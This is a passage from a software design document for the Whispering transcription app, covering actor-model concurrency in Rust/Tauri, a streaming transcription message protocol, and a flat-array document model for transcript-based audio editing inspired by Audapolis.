
The Actor Model (Erlang/Elixir OTP, Akka, Actix) uses independent "actors" running on separate cores, communicating only via message passing:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Actor A â”‚â”€â”€â”€â–¶â”‚  Actor B â”‚â”€â”€â”€â–¶â”‚  Actor C â”‚
â”‚  (Core 1)â”‚â—€â”€â”€â”€â”‚  (Core 2)â”‚â—€â”€â”€â”€â”‚  (Core 3)â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     â”‚               â”‚               â”‚
     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              Message Passing
```

Key properties:

- **Isolation**: Each actor has private state, no shared memory
- **Message passing**: Communication only via async messages
- **Concurrency**: Actors run in parallel on different cores
- **Fault tolerance**: Actor crashes don't bring down the system

### Whispering Actor Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        Whispering App                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   AudioChunk    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚   Recorder  â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶â”‚   Transcriber   â”‚            â”‚
â”‚  â”‚    Actor    â”‚                 â”‚      Actor      â”‚            â”‚
â”‚  â”‚  (Core 1)   â”‚                 â”‚    (Core 2)     â”‚            â”‚
â”‚  â”‚             â”‚                 â”‚                 â”‚            â”‚
â”‚  â”‚ - CPAL mic  â”‚                 â”‚ - Whisper.cpp   â”‚            â”‚
â”‚  â”‚ - VAD       â”‚                 â”‚ - GPU/CPU bound â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                 â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚        â”‚                                  â”‚                     â”‚
â”‚        â”‚ RecordingState                   â”‚ Transcript          â”‚
â”‚        â–¼                                  â–¼                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”‚
â”‚  â”‚                  Coordinator Actor                   â”‚        â”‚
â”‚  â”‚                      (Core 3)                        â”‚        â”‚
â”‚  â”‚                                                      â”‚        â”‚
â”‚  â”‚  - Orchestrates workflow                             â”‚        â”‚
â”‚  â”‚  - Maintains app state (Functional Core here!)       â”‚        â”‚
â”‚  â”‚  - Routes messages between actors                    â”‚        â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â”‚
â”‚                         â”‚                                       â”‚
â”‚         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                       â”‚
â”‚         â”‚               â”‚               â”‚                       â”‚
â”‚         â–¼               â–¼               â–¼                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                 â”‚
â”‚  â”‚ Transformerâ”‚  â”‚  Clipboard â”‚  â”‚    UI      â”‚                 â”‚
â”‚  â”‚   Actor    â”‚  â”‚   Actor    â”‚  â”‚   Actor    â”‚                 â”‚
â”‚  â”‚  (Core 4)  â”‚  â”‚  (Main)    â”‚  â”‚  (Main)    â”‚                 â”‚
â”‚  â”‚            â”‚  â”‚            â”‚  â”‚            â”‚                 â”‚
â”‚  â”‚ - LLM call â”‚  â”‚ - Paste    â”‚  â”‚ - Svelte   â”‚                 â”‚
â”‚  â”‚ - Groq API â”‚  â”‚ - Type     â”‚  â”‚ - Render   â”‚                 â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                 â”‚
â”‚                                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Message Types for Actors

```typescript
// Messages (Events) that flow between actors
type WhisperingActorMessage =
	| { type: 'START_RECORDING' }
	| { type: 'AUDIO_CHUNK'; data: Float32Array }
	| { type: 'STOP_RECORDING' }
	| { type: 'TRANSCRIPT_READY'; text: string; confidence: number }
	| { type: 'TRANSFORM_TEXT'; text: string; transformation: string }
	| { type: 'TRANSFORMED'; original: string; result: string }
	| { type: 'COPY_TO_CLIPBOARD'; text: string }
	| { type: 'STATE_UPDATED'; state: WhisperingState };
```

### Coordinator's Functional Core

The Coordinator actor uses a pure reducer internally (FC/IS pattern):

```typescript
// Pure reducer inside Coordinator actor
function coordinatorReducer(
	state: WhisperingState,
	msg: WhisperingActorMessage,
): [WhisperingState, WhisperingActorMessage[]] {
	switch (msg.type) {
		case 'START_RECORDING':
			return [
				{ ...state, status: 'recording' },
				[], // No outgoing messages yet
			];

		case 'TRANSCRIPT_READY':
			const newState = {
				...state,
				status: 'transforming',
				currentTranscript: msg.text,
			};
			// Decide what to do next based on settings
			const outgoing: WhisperingActorMessage[] = state.settings.autoTransform
				? [
						{
							type: 'TRANSFORM_TEXT',
							text: msg.text,
							transformation: state.settings.defaultTransformation,
						},
					]
				: [{ type: 'COPY_TO_CLIPBOARD', text: msg.text }];

			return [newState, outgoing];

		case 'TRANSFORMED':
			return [
				{ ...state, status: 'idle', lastResult: msg.result },
				[{ type: 'COPY_TO_CLIPBOARD', text: msg.result }],
			];

		default:
			return [state, []];
	}
}
```

### Rust/Tauri Implementation

In Tauri, actors can be implemented with **Tokio tasks** or **threads**:

```rust
use tokio::sync::mpsc;

struct RecorderActor {
    output: mpsc::Sender<WhisperingMessage>,
}

impl RecorderActor {
    async fn run(mut self, mut input: mpsc::Receiver<WhisperingMessage>) {
        while let Some(msg) = input.recv().await {
            match msg {
                WhisperingMessage::StartRecording => {
                    // Start CPAL stream on this thread
                    // Send AudioChunks to Transcriber
                }
                WhisperingMessage::StopRecording => {
                    // Stop and notify coordinator
                }
                _ => {}
            }
        }
    }
}

struct TranscriberActor {
    output: mpsc::Sender<WhisperingMessage>,
    whisper: WhisperContext,  // CPU-bound, benefits from dedicated core
}

impl TranscriberActor {
    async fn run(mut self, mut input: mpsc::Receiver<WhisperingMessage>) {
        while let Some(msg) = input.recv().await {
            match msg {
                WhisperingMessage::AudioChunk { data } => {
                    // Run whisper inference (CPU-heavy)
                    let transcript = self.whisper.transcribe(&data);
                    self.output.send(WhisperingMessage::TranscriptReady {
                        text: transcript
                    }).await;
                }
                _ => {}
            }
        }
    }
}
```

### Multi-Core Benefits for Whispering

| Actor           | Work Type   | Core Benefit                            |
| --------------- | ----------- | --------------------------------------- |
| **Recorder**    | Real-time   | Dedicated thread = no audio dropouts    |
| **Transcriber** | CPU-heavy   | Whisper inference doesn't block UI      |
| **Transformer** | Network I/O | LLM calls run parallel to other work    |
| **Coordinator** | Light       | Event routing, state management         |
| **UI**          | Main thread | Responsive even during heavy processing |

### Video Editor Example (Multi-Core Intensive)

A video editor more clearly demonstrates multi-core actors:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      Video Editor App                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”‚
â”‚  â”‚   Decoder   â”‚  â”‚   Decoder   â”‚  â”‚   Decoder   â”‚              â”‚
â”‚  â”‚   Actor 1   â”‚  â”‚   Actor 2   â”‚  â”‚   Actor 3   â”‚              â”‚
â”‚  â”‚  (Core 1)   â”‚  â”‚  (Core 2)   â”‚  â”‚  (Core 3)   â”‚              â”‚
â”‚  â”‚             â”‚  â”‚             â”‚  â”‚             â”‚              â”‚
â”‚  â”‚ Track 1     â”‚  â”‚ Track 2     â”‚  â”‚ Audio       â”‚              â”‚
â”‚  â”‚ (4K video)  â”‚  â”‚ (overlay)   â”‚  â”‚ (48kHz)     â”‚              â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜              â”‚
â”‚         â”‚                â”‚                â”‚                     â”‚
â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                          â–¼                                      â”‚
â”‚                 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                             â”‚
â”‚                 â”‚    Compositor   â”‚                             â”‚
â”‚                 â”‚      Actor      â”‚                             â”‚
â”‚                 â”‚    (Core 4)     â”‚                             â”‚
â”‚                 â”‚                 â”‚                             â”‚
â”‚                 â”‚ - Blend layers  â”‚                             â”‚
â”‚                 â”‚ - Apply effects â”‚                             â”‚
â”‚                 â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                             â”‚
â”‚                          â”‚                                      â”‚
â”‚         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚         â–¼                â–¼                â–¼                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                 â”‚
â”‚  â”‚  Preview   â”‚  â”‚   Export   â”‚  â”‚  Waveform  â”‚                 â”‚
â”‚  â”‚   Actor    â”‚  â”‚   Actor    â”‚  â”‚   Actor    â”‚                 â”‚
â”‚  â”‚  (Core 5)  â”‚  â”‚  (Core 6)  â”‚  â”‚  (Core 7)  â”‚                 â”‚
â”‚  â”‚            â”‚  â”‚            â”‚  â”‚            â”‚                 â”‚
â”‚  â”‚ - 30fps    â”‚  â”‚ - H.264    â”‚  â”‚ - FFT      â”‚                 â”‚
â”‚  â”‚ - Realtime â”‚  â”‚ - Encoding â”‚  â”‚ - Draw     â”‚                 â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                 â”‚
â”‚                                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### When to Use Actors vs Simple Async

| Use Actors When                        | Use Simple Async When            |
| -------------------------------------- | -------------------------------- |
| CPU-bound work (Whisper, video decode) | I/O-bound work (HTTP, file read) |
| Strict isolation needed                | Shared state is acceptable       |
| Real-time constraints (audio capture)  | Latency tolerance is high        |
| Fault isolation needed                 | Failure handling is simple       |
| Clear data flow between components     | Components are tightly coupled   |

### Actor Libraries for Tauri

| Library     | Language | Notes                                  |
| ----------- | -------- | -------------------------------------- |
| **Actix**   | Rust     | Mature, high performance               |
| **Tokio**   | Rust     | Tasks + mpsc channels (lightweight)    |
| **xtra**    | Rust     | Simple, async-native actors            |
| **ractor**  | Rust     | Erlang-style supervision               |
| **Comlink** | JS       | Web Workers as actors (for UI plugins) |

### Combining FC/IS + Actors + Plugins

The full architecture combines all three patterns:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    WHISPERING FULL ARCHITECTURE                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  ACTORS (Multi-Core)                                                    â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                    â”‚
â”‚  Each actor runs on its own thread/core:                                â”‚
â”‚  â€¢ Recorder Actor â†’ Transcriber Actor â†’ Coordinator Actor               â”‚
â”‚                                                                          â”‚
â”‚  FUNCTIONAL CORE (Within Each Actor)                                    â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                    â”‚
â”‚  Each actor has a pure reducer:                                         â”‚
â”‚  â€¢ state' = reducer(state, message)                                     â”‚
â”‚  â€¢ Commands generated, shell executes                                   â”‚
â”‚                                                                          â”‚
â”‚  PLUGINS (Extension Points)                                             â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                              â”‚
â”‚  Plugins extend actors via sandboxed boundaries:                        â”‚
â”‚  â€¢ Tier 1 (Wasm): Transcriber Actor loads plugin transcription services â”‚
â”‚  â€¢ Tier 2 (iframe): UI Actor embeds plugin pages                        â”‚
â”‚  â€¢ Tier 3 (Native): Recorder Actor uses signed CPAL plugin              â”‚
â”‚                                                                          â”‚
â”‚  EVENT SOURCING (Communication)                                         â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                          â”‚
â”‚  All communication is via typed events:                                 â”‚
â”‚  â€¢ Actor â†’ Actor: WhisperingActorMessage                                â”‚
â”‚  â€¢ Host â†’ Plugin: WhisperingEvent                                       â”‚
â”‚  â€¢ Plugin â†’ Host: WhisperingIntent                                      â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Real-Time Transcription Support

### Current vs Real-Time Architecture

The current architecture uses a **batch model**:

```
Record (capture ALL audio) â†’ Stop â†’ Transcribe (entire blob) â†’ Transform â†’ Deliver
         â”‚                                    â”‚
         â””â”€â”€â”€â”€ minutes of audio â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    ONE blob, ONE API call
```

Real-time transcription uses a **streaming model**:

```
Record â”€â”€chunkâ”€â”€â–º Transcribe â”€â”€partialâ”€â”€â–º UI (live text)
       â”€â”€chunkâ”€â”€â–º Transcribe â”€â”€partialâ”€â”€â–º UI
       â”€â”€chunkâ”€â”€â–º Transcribe â”€â”€partialâ”€â”€â–º UI
       â”€â”€chunkâ”€â”€â–º Transcribe â”€â”€finalâ”€â”€â”€â”€â–º Transform â†’ Deliver
```

### Impact on Actor Architecture

The actor boundaries **don't change** - you still have the same actors. What changes is:

| Aspect                | Batch            | Real-Time           |
| --------------------- | ---------------- | ------------------- |
| **Message frequency** | 1 message (blob) | N messages (chunks) |
| **Transcriber state** | Stateless        | Stateful (context)  |
| **UI updates**        | Once at end      | Continuous          |
| **Transform/Deliver** | After transcribe | After FINAL only    |

### Message Protocol for Real-Time

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// RECORDER â†’ TRANSCRIBER
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/** Continuous: Sent every TIMESLICE_MS while recording */
type AudioChunk = {
	type: 'AUDIO_CHUNK';
	sessionId: string;
	chunkIndex: number;
	timestamp: number;
	data: Blob;
	cumulativeDuration: number;
};

/** Once: Sent when user stops recording */
type RecordingStopped = {
	type: 'RECORDING_STOPPED';
	sessionId: string;
	totalChunks: number;
	totalDuration: number;
	finalBlob: Blob;
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TRANSCRIBER â†’ UI, COORDINATOR
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/** Continuous: Sent as transcription progresses */
type TranscriptPartial = {
	type: 'TRANSCRIPT_PARTIAL';
	sessionId: string;
	chunkIndex: number;
	text: string; // Full transcript so far
	confidence: number;
	isFinal: false;
};

/** Once: Sent when transcription is complete */
type TranscriptFinal = {
	type: 'TRANSCRIPT_FINAL';
	sessionId: string;
	text: string;
	confidence: number;
	segments?: TranscriptSegment[];
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// COORDINATOR ROUTING LOGIC
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// TRANSCRIPT_PARTIAL â†’ Forward to UI only (don't act on partials)
// TRANSCRIPT_FINAL   â†’ Forward to UI, then route to Transformer OR Delivery
```

### Transcriber Actor State Machine

```typescript
type TranscriberState =
  | { status: 'idle' }
  | { status: 'streaming'; session: StreamingSession }
  | { status: 'finalizing'; session: StreamingSession };

type StreamingSession = {
  sessionId: string;
  provider: TranscriptionProvider;
  connection: WebSocket | null;     // For streaming providers
  context: TranscriptionContext;    // Provider-specific state
  chunks: Map<number, Blob>;        // Buffer for out-of-order
  partialText: string;
};

// The Transcriber handles both batch and streaming providers:
handle(msg: AudioChunk) {
  if (this.provider.supportsStreaming) {
    // Send chunk immediately, emit partial when response arrives
    this.connection.send(msg.data);
  } else {
    // Buffer chunk, wait for RECORDING_STOPPED
    this.buffer.push(msg.data);
  }
}

handle(msg: RecordingStopped) {
  if (this.provider.supportsStreaming) {
    // Close WebSocket, wait for final from provider
    this.connection.close();
  } else {
    // Now send entire blob to batch API
    const blob = new Blob(this.buffer);
    const text = await this.provider.transcribe(blob);
    emit({ type: 'TRANSCRIPT_FINAL', text });
  }
}
```

### Batch vs Streaming: Same Protocol, Different Timing

The protocol supports both modes - batch is just streaming with buffered chunks:

```
STREAMING MODE (Deepgram, AssemblyAI):
AUDIO_CHUNK (0) â†’ PARTIAL ("Hello")
AUDIO_CHUNK (1) â†’ PARTIAL ("Hello, my")
AUDIO_CHUNK (2) â†’ PARTIAL ("Hello, my name")
RECORDING_STOPPED â†’ FINAL ("Hello, my name is Claude")

BATCH MODE (OpenAI, Groq):
AUDIO_CHUNK (0) â†’ (buffered, no response)
AUDIO_CHUNK (1) â†’ (buffered, no response)
AUDIO_CHUNK (2) â†’ (buffered, no response)
RECORDING_STOPPED â†’ FINAL ("Hello, my name is Claude")
```

### Streaming Transcription Providers

| Provider          | Streaming       | Protocol       |
| ----------------- | --------------- | -------------- |
| **OpenAI**        | No              | REST           |
| **Groq**          | No              | REST           |
| **Deepgram**      | **Yes**         | WebSocket      |
| **AssemblyAI**    | **Yes**         | WebSocket      |
| **Google Speech** | **Yes**         | gRPC/WebSocket |
| **Azure Speech**  | **Yes**         | WebSocket      |
| **Whisper.cpp**   | **Yes** (local) | Direct         |

### UI Integration for Live Transcription

```svelte
<script lang="ts">
	import { coordinatorState } from '$lib/actors/coordinator';

	let partialTranscript = $derived($coordinatorState.partialTranscript);
	let isTranscribing = $derived($coordinatorState.status === 'transcribing');
</script>

{#if isTranscribing}
	<div class="live-transcript">
		<p>
			{partialTranscript}
			<span class="cursor blink">|</span>
		</p>
	</div>
{/if}
```

### Minimal Changes Required

The actor model makes real-time transcription **easier** because:

1. **Actors naturally handle message streams** - no architectural change
2. **State is already encapsulated** - Transcriber just tracks context
3. **Message routing is explicit** - Coordinator decides when to trigger Transform
4. **UI is already reactive** - just subscribe to partials

Changes needed:

1. Add `onChunk` callback to Recorder (~5 lines)
2. Make Transcriber stateful (track context between chunks)
3. Add streaming provider implementations (Deepgram, etc.)
4. Add `partialTranscript` to UI state

---

## Text-Based Media Editing

### Overview

Text-based media editing allows users to edit audio/video by editing the transcript text. Delete a word from the transcript, and the corresponding audio is cut. This is the core innovation behind tools like Descript.

**Reference Implementation:** [Audapolis](https://github.com/bugbakery/audapolis) - an open-source Electron app that implements this pattern. Our analysis of Audapolis informs this design.

### Core Insight: Source References

The key architectural insight is that **the transcript IS the edit list**. Each word in the transcript stores a reference to its position in the original source media:

```typescript
// Each word points back to its location in the source audio
interface TextItem {
	type: 'text';
	uuid: string;
	source: string; // Hash of source media file
	sourceStart: number; // Start time in source (seconds)
	length: number; // Duration in source (seconds)
	text: string; // The transcribed word
	conf: number; // Confidence score (0-1)
}
```

**When you delete text, you're removing the reference, not the audio:**

```
Original: "Hello my um name is Claude"
          â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Source:   [0.0-0.3][0.3-0.5][0.5-0.7][0.7-1.0][1.0-1.2][1.2-1.6]

User deletes "um":
Edited:   "Hello my name is Claude"
          â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Source:   [0.0-0.3][0.3-0.5][0.7-1.0][1.0-1.2][1.2-1.6]
                           â†‘
                    Gap where "um" was (not played)
```

### Document Model

Following Audapolis's proven pattern, we use a **flat array with markers** rather than nested paragraphs:

```typescript
// Document item types
type DocumentItem =
	| ParagraphStartItem
	| ParagraphEndItem
	| TextItem
	| NonTextItem
	| ArtificialSilenceItem
	| GeneratedTextItem; // For AI voice synthesis (see Section 17)

interface ParagraphStartItem {
	type: 'paragraph_start';
	uuid: string;
	speaker: string;
	language: string | null;
}

interface ParagraphEndItem {
	type: 'paragraph_end';
	uuid: string;
}

interface TextItem {
	type: 'text';
	uuid: string;
	source: string; // Source media hash
	sourceStart: number; // Position in source
	length: number; // Duration
	text: string; // Transcribed word
	conf: number; // Confidence
}

interface NonTextItem {
	type: 'non_text';
	uuid: string;
	source: string;
	sourceStart: number;
	length: number;
	// Represents silence, breathing, background noise, etc.
}

interface ArtificialSilenceItem {
	type: 'artificial_silence';
	uuid: string;
	length: number;
	// User-inserted pause (no source reference)
}
```

**Why flat array instead of nested paragraphs?**

| Aspect          | Nested Structure       | Flat Array (Audapolis) |
| --------------- | ---------------------- | ---------------------- |
| Selection       | Complex tree traversal | Simple array indices   |
| Cut/Copy/Paste  | Tree manipulation      | Array splice           |
| Cursor position | Path through tree      | Single index           |
| Undo/Redo       | Complex diff           | Array snapshots        |
| Implementation  | ~2x complexity         | Straightforward        |

### Example Document

```typescript
const document: EditableDocument = {
	content: [
		{ type: 'paragraph_start', speaker: 'Alice', language: 'en', uuid: 'p1' },
		{
			type: 'text',
			source: 'abc123',
			sourceStart: 0.0,
			length: 0.3,
			text: 'Hello',
			conf: 0.98,
			uuid: 'w1',
		},
		{
			type: 'text',
			source: 'abc123',
			sourceStart: 0.3,
			length: 0.2,
			text: 'my',
			conf: 0.95,
			uuid: 'w2',
		},
		{
			type: 'non_text',
			source: 'abc123',
			sourceStart: 0.5,
			length: 0.2,
			uuid: 'n1',
		}, // breathing
		{
			type: 'text',
			source: 'abc123',
			sourceStart: 0.7,
			length: 0.3,
			text: 'name',
			conf: 0.97,
			uuid: 'w3',
		},
		{
			type: 'text',
			source: 'abc123',
			sourceStart: 1.0,
			length: 0.2,
			text: 'is',
			conf: 0.99,
			uuid: 'w4',
		},
		{
			type: 'text',
			source: 'abc123',
			sourceStart: 1.2,
			length: 0.4,
			text: 'Alice',
			conf: 0.96,
			uuid: 'w5',
		},
		{ type: 'paragraph_end', uuid: 'p1e' },
	],
	sources: {
		abc123: { blob: Blob, objectUrl: 'blob:...' },
	},
	metadata: {
		displaySpeakerNames: true,
		displayVideo: false,
	},
};
```

### Computed Timing (Not Stored)

Absolute times are **computed on-demand**, not stored in the document:

```typescript
interface TimedDocumentItem extends DocumentItem {
	absoluteStart: number; // Computed: position in edited timeline
	absoluteIndex: number; // Computed: index in array
}

function computeTimedItems(content: DocumentItem[]): TimedDocumentItem[] {
	let absoluteTime = 0;
